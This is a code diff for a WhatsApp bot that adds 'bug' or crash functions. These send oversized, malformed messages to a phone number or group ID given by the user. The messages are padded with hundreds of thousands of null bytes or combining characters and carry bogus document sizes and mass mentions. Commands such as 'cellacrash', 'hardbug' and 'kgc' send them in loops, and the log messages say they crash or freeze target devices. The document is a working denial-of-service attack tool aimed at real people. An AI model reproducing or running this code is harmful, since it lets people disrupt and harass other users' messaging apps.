+            previewType: 0,
+            mediaUrl: my.gh,
+            sourceUrl: my.gh
+        }
+    },
+    
+    footer: "© Langz",
+    
+    buttons: [
+        { buttonId: ".bot mode self", buttonText: { displayText: "🤖 Self Mode" }, type: 1 },
+        { buttonId: ".bot mode public", buttonText: { displayText: "🌍 Public Mode" }, type: 1 },
+        {
+            buttonId: 'action',
+            buttonText: { displayText: '📋 Pilih Menu' },
+            type: 4,
+            nativeFlowInfo: {
+                name: 'single_select',
+                paramsJson: JSON.stringify({
+                    title: "📌 Menu Utama",
+                    sections: [
+                        {
+                            title: "🔰 *Main Menu*",
+                            highlight_label: "Powered by Galangz",
+                            rows: [
+                                { title: "📜 All Commands", description: "Daftar Semua Perintah Bot", id: ".allmenu" },
+                                { title: "👤 Owner", description: "Info Pemilik Bot", id: ".owner" },
+                                { title: "🎁 Donasi", description: "Bantu Kami dengan Donasi", id: ".donasi" },
+                                { title: "⚙️ Bot Settings", description: "Pengaturan Bot", id: ".botsettings" }
+                            ]
+                        },
+                        {
+                            title: "🌟 *Fitur Bot*",
+                            rows: [
+                                { title: "📂 Downloader", description: "Unduh Video, Musik, dan Lainnya", id: ".downloadmenu" },
+                                { title: "🛠 Tools", description: "Kumpulan Alat Berguna", id: ".toolsmenu" },
+                                { title: "🖼 Sticker", description: "Buat dan Unduh Sticker", id: ".stickermenu" },
+                                { title: "🎮 Game", description: "Mainkan Game Seru!", id: ".gamemenu" }
+                            ]
+                        },
+                        {
+                            title: "📢 *Grup & Sosial*",
+                            rows: [
+                                { title: "👥 Grup Menu", description: "Fitur Khusus Grup", id: ".groupmenu" },
+                                { title: "💬 Chat AI", description: "Ngobrol dengan AI", id: ".chatmenu" }
+                            ]
+                        }
+                    ]
+                })
+            },
+            viewOnce: true
+        }
+    ],
+    
+    viewOnce: true,
+    headerType: 4
+}, { remoteJid: zLoc }, { messageId: null });
+}
+
+async function documentfreeze2(zLoc, ptcp = false) {
+    let uitext = "Cella" +  "꧀ *~@1~*".repeat(50000);
+    await sych.relayMessage(zLoc, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+                            fileSha256: "7SXMgNYBO4tkPSk3W46FQ3hUcK6K6G3//TiB5/ibhwg=",
+                            fileLength: "829710112",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "/gaasVF/Lt68CK4sy5DTRhJDQls+RwNDwU6yhGZjPCk=",
+                            fileName: "@cella💸",
+                            fileEncSha256: "nRvyfj/ky0+6upJrQMnwtuXm6lye2RuavfYM+cVl0hU=",
+                            directPath: "v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0",
+                            mediaKeyTimestamp: "1732537847",
+                            contactVcard: true
+                        },
+                        title: "",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: uitext
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: zLoc } }, { messageId: null });
+}
+
+
+    async function Gsz(zLoc, ptcp = false) {
+      await sych.relayMessage(
+        zLoc,
+        {
+          viewOnceMessage: {
+            message: {
+              interactiveMessage: {
+                header: {
+                  title: "",
+                  locationMessage: {},
+                  hasMediaAttachment: true,
+                },
+                body: {
+                  text: "⚝CellaForyou⚝" + "\u0000".repeat(900000),
+                },
+                nativeFlowMessage: {
+                  messageParamsJson: "",
+                },
+                carouselMessage: {},
+              },
+            },
+          },
+        },
+        {
+          participant: {
+            jid: zLoc,
+          },
+        }
+      );
+      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
+    }
+    
+async function uidoc2(zLoc, ptcp = false) {
+    let akumw = "~Crash~" + "ꦿꦾ".repeat(50000);
+    await sych.relayMessage(zLoc, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: " .⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤ ",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: akumw
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Credits to xin bro " }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: zLoc } }, { messageId: null });
+}
+
+
+
+async function liveLokFreeze(zLoc, ptcp = false) {
+        let xcl = "ꪶ𖣂ꫂ xCella 厷"+"𑲭𑲭".repeat(77777) + "@1".repeat(77777);
+var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": xcl,
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     },
+     body: {
+     text: "virtex"
+     },
+     nativeFlowMessage: {},
+     contextInfo: {
+     mentionedJid: ["6285805338638@s.whatsapp.net"],
+     groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: xcl }]
+     }
+  }
+}
+}), { userJid: zLoc, quoted: m })
+await sych.relayMessage(zLoc, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id })
+console.log(chalk.red.bold('Crash System Device By Cella'))
+}
+
+// Ios Speciality //
+	async function IosPayM(zLoc, ptcp = false) {
+			sych.relayMessage(zLoc, {
+				'paymentInviteMessage': {
+					'serviceType': "UPI",
+					'expiryTimestamp': Date.now() + 86400000
+				}
+			}, {
+				'participant': {
+					'jid': zLoc
+				}
+			});
+			console.log(chalk.green("Cella Bot | Bug Sent "));
+		};
+		
+				async function IosStanza(zLoc, ptcp = false) {
+			sych.relayMessage(zLoc, {
+				'extendedTextMessage': {
+					'text': 'CellaBugs' + 'ꦾ'.repeat(35000),
+					'contextInfo': {
+						'stanzaId': zLoc,
+						'participant': zLoc,
+						'quotedMessage': {
+							'conversation': '🌷 Cella Here' + 'ꦾ'.repeat(50000)
+						},
+						'disappearingMode': {
+							'initiator': "CHANGED_IN_CHAT",
+							'trigger': "CHAT_SETTING"
+						}
+					},
+					'inviteLinkGroupTypeV2': "DEFAULT"
+				}
+			}, {
+				'participant': {
+					'jid': zLoc
+				}
+			}, {
+				'messageId': null
+			});
+			console.log(chalk.green("Attacking | Bug Sent 😈"));
+		};
+		
+				async function IosCL(zLoc, ptcp = false) {
+			await sych.relayMessage(zLoc, {
+					"extendedTextMessage": {
+						"text": " Hello This Is cella ",
+						"contextInfo": {
+							"stanzaId": "1234567890ABCDEF",
+							"participant": "0@s.whatsapp.net",
+							"quotedMessage": {
+								"callLogMesssage": {
+									"isVideo": true,
+									"callOutcome": "1",
+									"durationSecs": "0",
+									"callType": "REGULAR",
+									"participants": [{
+										"jid": "0@s.whatsapp.net",
+										"callOutcome": "1"
+									}]
+								}
+							},
+							"remoteJid": zLoc,
+							"conversionSource": "source_example",
+							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
+							"conversionDelaySeconds": 10,
+							"forwardingScore": 9999999,
+							"isForwarded": true,
+							"quotedAd": {
+								"advertiserName": "Example Advertiser",
+								"mediaType": "IMAGE",
+								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+								"caption": "This is an ad caption"
+							},
+							"placeholderKey": {
+								"remoteJid": "6281991410940@s.whatsapp.net",
+								"fromMe": false,
+								"id": "ABCDEF1234567890"
+							},
+							"expiration": 86400,
+							"ephemeralSettingTimestamp": "1728090592378",
+							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+							"externalAdReply": {
+								"title": "Hello ",
+								"body": " 🌷 Cella Is Here ϟ",
+								"mediaType": "VIDEO",
+								"renderLargerThumbnail": true,
+								"previewTtpe": "VIDEO",
+								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+								"sourceType": " x ",
+								"sourceId": " x ",
+								"sourceUrl": " p ",
+								"mediaUrl": " p ",
+								"containsAutoReply": true,
+								"renderLargerThumbnail": true,
+								"showAdAttribution": true,
+								"ctwaClid": "ctwa_clid_example",
+								"ref": "ref_example"
+							},
+							"entryPointConversionSource": "entry_point_source_example",
+							"entryPointConversionApp": "entry_point_app_example",
+							"entryPointConversionDelaySeconds": 5,
+							"disappearingMode": {},
+							"actionLink": {
+								"url": " p "
+							},
+							"groupSubject": "Example Group Subject",
+							"parentGroupJid": "6287888888888-1234567890@g.us",
+							"trustBannerType": "trust_banner_example",
+							"trustBannerAction": 1,
+							"isSampled": false,
+							"utm": {
+								"utmSource": "utm_source_example",
+								"utmCampaign": "utm_campaign_example"
+							},
+							"forwardedNewsletterMessageInfo": {
+								"newsletterJid": "6287888888888-1234567890@g.us",
+								"serverMessageId": 1,
+								"newsletterName": " X ",
+								"contentType": "UPDATE",
+								"accessibilityText": " X "
+							},
+							"businessMessageForwardInfo": {
+								"businessOwnerJid": "0@s.whatsapp.net"
+							},
+							"smbClientCampaignId": "smb_client_campaign_id_example",
+							"smbServerCampaignId": "smb_server_campaign_id_example",
+							"dataSharingContext": {
+								"showMmDisclosure": true
+							}
+						}
+					}
+				},
+				ptcp ? {
+					participant: {
+						jid: zLoc,
+					}
+				} : {}
+			);
+			console.log(chalk.green("Cella Bot Attacked Someone!"));
+		};
+		
+// Blank Speciality //
+async function BlankInvite(LockJids, ptcp = false) {
+			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
+				'viewOnceMessage': {
+					'message': {
+						"newsletterAdminInviteMessage": {
+							"newsletterJid": `120363298524333143@newsletter`,
+							"newsletterName": "DasarKontol" + "\u0000".repeat(50000),
+							"jpegThumbnail": "",
+							"caption": 'ꦾ'.repeat(30000),
+							"inviteExpiration": Date.now() + 1600
+						}
+					}
+				}
+			}), {
+				'userJid': LockJids
+			});
+			await sych.relayMessage(LockJids, messageContent.message, {
+				'participant': {
+					'jid': LockJids
+				},
+				'messageId': messageContent.key.id
+			});
+		}
+
+ 
 		switch (command) {
+		
+		case 'tessss': {
+    try {
+        // Membuat pesan dengan tombol di WhatsApp
+        const xp = generateWAMessageFromContent(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    buttonsMessage: {
+                        buttons: [
+                            {
+                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
+                                buttonText: { displayText: "InfoSC" },
+                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
+                            }
+                        ],
+                        contentText: `${ucapanWaktu} @${m.sender.split('@')[0]}
+    
+${f}*Name* : ${m.pushName ? m.pushName : 'Lu Siapa?'}
+${f}*Owner* : @${owner[0].split('@')[0]}
+${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
+${f}*Tanggal* : ${tanggal}
+${f}*Hari* : ${hari}
+${f}*Jam* : ${jam} WIB`,
+                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
+                        text: "InfoSC"
+                    }
+                }
+            }
+        }, { ephemeralExpiration: 5, timestamp: new Date() });
+
+        // Mengirim pesan dengan tombol
+        const x1 = await sych.relayMessage(m.chat, xp.message, {
+				'user': {
+					'jid': m.chat
+				}
+				});
+
+        // Menyiapkan pesan respons tombol
+        const od = await sych.relayMessage(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    buttonsResponseMessage: {
+                        selectedButtonId: `${"\u0000".repeat(510000)}`, // Potensi crash uji coba
+                        selectedDisplayText: "InfoSC",
+                        type: proto.Message.ButtonsResponseMessage.Type.DISPLAY_TEXT,
+                        contextInfo: {
+                            participant: m.chat,
+                            remoteJid: m.chat,
+                            stanzaId: x1,  // Menggunakan ID pesan sebelumnya
+                            quotedMessage: {
+                                viewOnceMessage: {
+                message: {
+                    buttonsMessage: {
+                        buttons: [
+                            {
+                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
+                                buttonText: { displayText: "InfoSC" },
+                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
+                            }
+                        ],
+                        contentText: `${ucapanWaktu} @${m.sender.split('@')[0]}
+    
+${f}*Name* : ${m.pushName ? m.pushName : 'Lu Siapa?'}
+${f}*Owner* : @${owner[0].split('@')[0]}
+${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
+${f}*Tanggal* : ${tanggal}
+${f}*Hari* : ${hari}
+${f}*Jam* : ${jam} WIB`,
+                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
+                        text: "InfoSc"
+                    }
+                }
+            }
+                            }
+                        }
+                    }
+                }
+            }
+        },{ userJid: m.chat, quoted: m });
+
+        // Mengirim balasan jika perintah valid
+        await sych.sendMessage(m.chat, { text: "Proses" }, { quoted: m });
+
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error);
+    }
+}
+break;
+
+case 'hshsh': {
+    try {
+        // Membuat pesan dengan tombol di WhatsApp
+        const xp = generateWAMessageFromContent(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    buttonsMessage: {
+                        buttons: [
+                            {
+                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
+                                buttonText: { displayText: "InfoSC" },
+                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
+                            }
+                        ],
+                        contentText: `${ucapanWaktu} @${m.sender.split('@')[0]}
+    
+${f}*Name* : ${m.pushName ? m.pushName : 'Lu Siapa?'}
+${f}*Owner* : @${owner[0].split('@')[0]}
+${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
+${f}*Tanggal* : ${tanggal}
+${f}*Hari* : ${hari}
+${f}*Jam* : ${jam} WIB`,
+                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
+                        text: "InfoSC"
+                    }
+                }
+            }
+        }, { ephemeralExpiration: 5, timestamp: new Date() });
+
+        // Mengirim pesan dengan tombol
+        const x1 = await sych.relayMessage(m.chat, xp.message, {
+				'user': {
+					'jid': m.chat
+				}
+				});
+
+        // Menyiapkan pesan respons tombol
+        const od = await sych.relayMessage(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    buttonsResponseMessage: {
+                        selectedButtonId: `${"\u0000".repeat(510000)}`, // Potensi crash uji coba
+                        selectedDisplayText: "InfoSC",
+                        type: proto.Message.ButtonsResponseMessage.Type.DISPLAY_TEXT,
+                        contextInfo: {
+                            participant: m.chat,
+                            remoteJid: m.chat,
+                            stanzaId: x1,  // Menggunakan ID pesan sebelumnya
+                            quotedMessage: {
+                                viewOnceMessage: {
+                message: {
+                    buttonsMessage: {
+                        buttons: [
+                            {
+                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
+                                buttonText: { displayText: "InfoSC" },
+                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
+                            }
+                        ],
+                        contentText: `${ucapanWaktu} @${m.sender.split('@')[0]}
+    
+${f}*Name* : ${m.pushName ? m.pushName : 'Lu Siapa?'}
+${f}*Owner* : @${owner[0].split('@')[0]}
+${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
+${f}*Tanggal* : ${tanggal}
+${f}*Hari* : ${hari}
+${f}*Jam* : ${jam} WIB`,
+                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
+                        text: "InfoSc"
+                    }
+                }
+            }
+                            }
+                        }
+                    }
+                }
+            }
+        },{ userJid: m.chat, quoted: m });
+
+        // Mengirim balasan jika perintah valid
+        await sych.sendMessage(m.chat, { text: "Proses" }, { quoted: m });
+
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error);
+    }
+}
+break;
+
+	
+case 'bpgc': {
+ 
+if (!q) return sycreply(`Example:\n ${prefix + command} ID GC`)
+BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.includes('@g.us') ? q : q.replace(/[^0-9]/g, '') + "@g.us";  
+sych.sendMessage(BapakLuWkwk, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
+m.reply("Done Clear Bug ")
+}
+break 
+	
 			
+case 'kgc':  
+    if (!q) return sycreply(`Masukkan ID Group\nContoh: ${prefix + command} Group_ID`);
+
+    // Mengubah format target ke grup
+    zLoc = q.includes('@g.us') ? q : q.replace(/[^0-9]/g, '') + "@g.us";  
+
+    sycreply(`Proses Kirim Pesan ke Group ID: ${zLoc}  
+    Please Wait...\n\n
+    > © Galangxyz
+    `, zLoc);  
+
+    async function sendMessages() {
+        for (let i = 0; i < 9; i++) {
+            try {
+
+                await langz(zLoc, ptcp = true);
+
+
+                // Delay antar-pengiriman agar tidak overlimit
+                await new Promise(resolve => setTimeout(resolve, 3000)); // 3 detik delay
+
+            } catch (error) {
+                console.error(`Gagal mengirim pesan ke ${zLoc}:`, error);
+            }
+        }
+    }
+
+    sendMessages().then(() => {
+        sycreply(`Successfully Kirim Pesan ke Group: ${zLoc}\n\n> © Galangxyz`, zLoc);
+    });
+
+    console.log(`Target Group JID: ${zLoc}`);
+    console.log(await sych.groupMetadata(zLoc));
+    
+    break;
+
+// Case Bug ! //
+case 'cellacrash': 
+
+   
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Lock Target: ${zLoc}
+Requested Bug: Freeze Bug
+© Cella 
+ `)
+     for (let i = 0; i < 9; i++) {
+    await uidoc(zLoc, ptcp = true)
+    await locasifreeze(zLoc, ptcp = true)
+    await documentfreeze(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: Freeze Bug
+ `)
+ break
+case 'byypas': 
+
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Lock Target: ${zLoc}
+Requested Bug: NewBug
+© Cella 
+ `)
+     for (let i = 0; i < 9; i++) {
+    await CallMsg(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: NewBug
+ `)
+ break
+ case 'clearbugs': {
+ 
+if (!q) return sycreply(`Example:\n ${prefix + command} 62xxxx`)
+BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+sych.sendMessage(BapakLuWkwk, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
+m.reply("Done Clear Bug ")
+}
+break 
+ case 'cellafreeze': 
+ 
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Lock Target: ${zLoc}
+Requested Bug: Freeze Bug
+© Cella 
+ `)
+     for (let i = 0; i < 9; i++) {
+    await uidoc(zLoc, ptcp = true)
+    await locasifreeze(zLoc, ptcp = true)
+    await documentfreeze(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: Freeze Bug
+ `)
+ break
+ case '🔥': 
+ 
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Lock Target: ${zLoc}
+Requested Bug: 🔥
+© Cella 
+ `)
+     for (let i = 0; i < 9; i++) {
+    await CaroUsel(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: ❤️‍🔥
+ `)
+ break
+ case 'hardbug': 
+ 
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Lock Target: ${zLoc}
+Requested Bug: hardbug
+© Cella 
+ `)
+     for (let i = 0; i < 9; i++) {
+    await XeonXRobust(zLoc, ptcp = true)
+    await xeonHARD(zLoc, ptcp = true)
+    await liveLokFreeze(zLoc, ptcp = true)
+    await newsLetter(zLoc, ptcp = true)   
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: hardbug
+ `)
+ break
+ case '😈': 
